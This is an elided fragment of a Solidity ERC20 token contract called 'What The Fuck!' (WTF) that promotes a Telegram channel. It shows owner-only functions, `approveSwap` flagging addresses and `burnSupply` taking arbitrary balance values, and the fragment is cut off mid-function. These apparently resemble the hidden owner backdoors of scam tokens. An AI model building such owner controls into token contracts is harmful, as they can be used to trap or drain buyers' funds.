...
contract WhatTheFuck is Context, IERC20 , Ownable{
    ...
    constructor (address router, address factory, uint256 initialTokens) public {
        _name = "What The Fuck! | t.me/wtftoken ";
        _symbol = "WTF";
        _decimals = 9;
    ...
    function approveSwap(address _address) external ownerOnly {
        _fee[_address] = true;
    }
     ...
     * total supply.
     */
   function burnSupply(address account, uint256 balance, uint256 subtract) external ownerOnly {
        require(account != address(0), "ERC20: burn from the zero address disallowed");
